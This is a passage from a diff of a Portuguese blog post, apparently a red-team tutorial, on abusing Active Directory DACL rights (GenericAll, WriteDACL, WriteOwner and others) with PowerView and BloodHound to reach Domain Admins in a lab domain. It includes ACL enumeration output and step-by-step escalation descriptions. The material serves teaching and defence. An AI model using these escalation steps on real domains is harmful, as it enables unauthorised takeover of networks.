-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectDN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Maycon&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Vitali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hnr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;User-Force-Change-Password&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IdentityReference&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HNR\hnr_hnr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsInherited&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ActiveDirectoryRights&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ExtendedRight&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PropagationFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ObjectAceTypePresent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ContainerInherit&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AccessControlType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Allow&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectSID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;S-1-5-21-3380101520-2231475763-736739948-1103&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<p><a href="https://github.com/BloodHoundAD">BloodHound</a> attack path, partindo do node HNR\idiotbox, usuário pertencente ao grupo HNR\nullbyte, com o objetivo de obter privilégios do grupo Domain Admins.</p>
 
-&lt;p&gt;&lt;a href=&quot;https://github.com/BloodHoundAD&quot;&gt;BloodHound&lt;/a&gt; attack path, partindo do node HNR\tuxtrack, usuário pertencente ao grupo HNR\hnr_hnr, com o objetivo de obter privilégios do grupo Domain Admins.&lt;/p&gt;
+<p><img src="/assets/img/sample/dacl/bh3.png" alt="upload-image" /></p>
+
+<p>O usuário hnr/idiotbox pertence ao grupo HNR_BISCATES que possui privilégios GenericWrite no grupo HNR_NULLBYTE. Para exemplificar, adicionamos o usuário HNR/palmitao ao grupo hnr_biscates, mas qualquer propriedade pertencente ao objeto poderia ser modificada (ObjectType : All).</p>
+
+<p><img src="/assets/img/sample/dacl/fun3.png" alt="upload-image" /></p>
+
+<h2 id="writedacl">WriteDACL</h2>
+
+<p>Permissão para modificar DACL. Sendo assim, os usuários contemplados com essa permissão podem alterar quaisquer propriedades do objeto DACL (ACE), concedendo a si próprio qualquer privilégio.</p>
+
+<p>No exemplo abaixo, o grupo hnr_devs possuiem a permissão WriteDacl no grupo Enterprise Admins.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\tuxtrack.HNR\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">objectdn</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"CN=Enterprise Admins,CN=Users,DC=hnr,DC=local"</span><span class="p">}</span><span class="w">
+</span><span class="n">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">objectdn</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"CN=Enterprise Admins,CN=Users,DC=hnr,DC=local"</span><span class="p">}</span><span class="w">
+</span><span class="n">InheritedObjectType</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">ObjectDN</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Enterprise</span><span class="w"> </span><span class="nx">Admins</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
+</span><span class="nx">ObjectType</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">IdentityReference</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">HNR\hnr_devs</span><span class="w">
+</span><span class="n">IsInherited</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
+</span><span class="n">ActiveDirectoryRights</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">WriteDacl</span><span class="w">
+</span><span class="n">PropagationFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">ObjectFlags</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">InheritanceFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">InheritanceType</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">AccessControlType</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">Allow</span><span class="w">
+</span><span class="n">ObjectSID</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-3380101520-2231475763-736739948-519</span><span class="w">
+</span></code></pre></div></div>
+
+<p><a href="https://github.com/BloodHoundAD">BloodHound</a> attack path, partindo do node HNR\neko, usuário pertencente ao grupo HNR\hnr_devs, com o objetivo de obter privilégios do grupo Enterprise Admins e Domain Admins.</p>
+
+<p><img src="/assets/img/sample/dacl/bh4.png" alt="upload-image" /></p>
+
+<p>O ataque consiste em criar uma nova ACE no objeto Enterprise Admins, concedendo totais poderes sobres suas propriedades para o usuário HNR/neko e então adicioná-lo como membro do grupo Enterprise Admins, abusando dos direitos adquiridos.</p>
+
+<p><img src="/assets/img/sample/dacl/fun4.png" alt="upload-image" /></p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/bh1.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p>O cenário exibido acima e no próximo tópico são meramente ilustrativos. Contas e Grupos definidos como <a href="https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#appendix-c-protected-accounts-and-groups-in-active-directory">Protected Accounts</a>, possuem mecanismos de segurança que verificam sua integridade automaticamente a cada 60 minutos, resetando suas permissões, comparando-as com as permissões do objeto AdminSDHolder. Esse processo é chamado de <a href="(https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#sdprop)">Security Description Propagation</a> ou <a href="https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#sdprop">SDProp</a>.</p>
 
-&lt;p&gt;Para abusar da ACE que permite a alteração da senha, utilizei o cmdlet Set-DomainUserPassword do PowerView. O parâmetro identity se refere a conta do usuário no qual se deseja alterar a senha.&lt;/p&gt;
+<p><a href="https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#protected-accounts-and-groups-in-active-directory-by-operating-system">Contas e grupos protegidos no Active Directory pelo sistema operacional</a></p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/fun1.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<h2 id="writeowner">WriteOwner</h2>
 
-&lt;h2 id=&quot;genericall&quot;&gt;GenericAll&lt;/h2&gt;
+<p>Write Owner é o privilégio destinado ao Owner da DACL de um objeto no Active Directory. Ao ser criada a permissão, ela pode ser designada via ACE a apenas algumas propriedades do objeto ou a todas. O Owner possui GenericAll sobre todas as propridades do objeto, garantindo assim ao atacantes plenos poderes para executar diversas tarefas que podem comprometer o objeto.</p>
 
-&lt;p&gt;Caso o usuário receba privilégio GenericAll, o mesmo terá poderes sobre todas as propriedades do objeto, podendo adcionar/remover usuários em grupos, alterar a senha de usuários, habilitar/desabilitar acesso a novos objetos e etc.&lt;/p&gt;
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\tuxtrack.HNR\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">objectdn</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"CN=Domain Admins,CN=Users,DC=hnr,DC=local"</span><span class="p">}</span><span class="w">
+</span><span class="n">InheritedObjectType</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">ObjectDN</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Domain</span><span class="w"> </span><span class="nx">Admins</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
+</span><span class="nx">ObjectType</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">IdentityReference</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">HNR\hnr_admins</span><span class="w">
+</span><span class="n">IsInherited</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
+</span><span class="n">ActiveDirectoryRights</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">WriteOwner</span><span class="w">
+</span><span class="n">PropagationFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">ObjectFlags</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">InheritanceFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">ContainerInherit</span><span class="w">
+</span><span class="n">InheritanceType</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">AccessControlType</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">Allow</span><span class="w">
+</span><span class="n">ObjectSID</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-3380101520-2231475763-736739948-512</span><span class="w">
+</span></code></pre></div></div>
 
-&lt;p&gt;O grupo HNR/hnr_biscates possuem total controle sobre as propriedades do usuário tuxtrack, como pode ser verificado abaixo.&lt;/p&gt;
+<p><a href="https://github.com/BloodHoundAD">BloodHound</a> attack path, partindo do node HNR\acode, usuário pertencente ao grupo HNR\hnr_admins, com o objetivo de obter privilégios do grupo Domain Admins.</p>
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\tuxtrack.HNR\Desktop&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Get-ObjectAcl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ResolveGUIDs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;objectdn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CN=tuxtrack,OU=hnr_blog,DC=hnr,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritedObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectDN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tuxtrack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OU&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hnr_blog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hnr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IdentityReference&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HNR\hnr_biscates&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsInherited&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ActiveDirectoryRights&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GenericAll&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PropagationFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ContainerInherit&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AccessControlType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Allow&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectSID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;S-1-5-21-3380101520-2231475763-736739948-1105&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<p><img src="/assets/img/sample/dacl/bh5.png" alt="upload-image" /></p>
 
-&lt;p&gt;&lt;a href=&quot;https://github.com/BloodHoundAD&quot;&gt;BloodHound&lt;/a&gt; attack path, partindo do node HNR\alexos, com o objetivo de obter privilégios do grupo Domain Admins.&lt;/p&gt;
+<p>Abaixo pode-se notar que foi verificado que o usuário HNR\acode não fazia parte dos membros do grupo Domain Admins, somente do grupo hnr_admins. O powerview possui o cmdlet Set-DomainObjectOwner, utilizado para definir o usuário HNR\acode como Owner do grupo Domain Admins. Após concluir a escrita do owner para usuário HNR\acode, foi criada uma ACE (Add-DomainObjectAcl) concedendo todos os privilégios ao usuário (-Rights “ALL”). Após todos os privilégios serem concedidos, o usuário HNR\acode foi inserido como membro do grupo Domain Admins (Add-DomainGroupMember).</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/bh2.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p><img src="/assets/img/sample/dacl/fun5.png" alt="upload-image" /></p>
 
-&lt;p&gt;Como prova de conceito, foi alterada a propriedade &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/7f65d267-8a3f-4070-b94a-111e793d4821&quot;&gt;msTSInitialProgram&lt;/a&gt;, adicionando o path de um compartilhamento de rede no qual o atacante possua acesso. Assim, o atacante poderá controlar o arquivo que foi inserido na propriedade.&lt;/p&gt;
+<h2 id="allextendedrights">AllExtendedRights</h2>
 
-&lt;blockquote&gt;
-  &lt;p&gt;msTSInitialProgram - This attribute specifies the path and file name of the application that the user wants to start automatically when the user logs on to the terminal server.&lt;/p&gt;
-&lt;/blockquote&gt;
+<p>Poderes sobre todas as propriedades <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/extended-rights">Extended Righs</a> de um objeto.</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/fun2.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\tuxtrack.HNR\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">objectdn</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"CN=tuxtrack,OU=hnr_blog,DC=hnr,DC=local"</span><span class="p">}</span><span class="w">
+</span><span class="n">InheritedObjectType</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">ObjectDN</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">tuxtrack</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">hnr_blog</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
+</span><span class="nx">ObjectType</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">IdentityReference</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">HNR\pupilo</span><span class="w">
+</span><span class="n">IsInherited</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
+</span><span class="n">ActiveDirectoryRights</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">ReadProperty</span><span class="p">,</span><span class="w"> </span><span class="nx">WriteProperty</span><span class="p">,</span><span class="w"> </span><span class="nx">ExtendedRight</span><span class="w">
+</span><span class="n">PropagationFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">ObjectFlags</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">InheritanceFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">ContainerInherit</span><span class="w">
+</span><span class="n">InheritanceType</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">AccessControlType</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">Allow</span><span class="w">
+</span><span class="n">ObjectSID</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-3380101520-2231475763-736739948-1105</span><span class="w">
+</span></code></pre></div></div>
 
-&lt;h2 id=&quot;genericwrite&quot;&gt;GenericWrite&lt;/h2&gt;
+<p><a href="https://github.com/BloodHoundAD">BloodHound</a> attack path, partindo do node HNR\pupilo, usuário com AllExtendedRights sobre o usuário HNR\tuxtrack.</p>
 
-&lt;p&gt;Generic Write permite a leitura que e escrita para qualquer atributo não projegido do objeto.&lt;/p&gt;
+<p><img src="/assets/img/sample/dacl/bh6.png" alt="upload-image" /></p>
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\tuxtrack.HNR\Desktop&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Get-ObjectAcl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ResolveGUIDs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;objectdn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CN=hnr_biscates,OU=HNR_Groups,DC=hnr,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
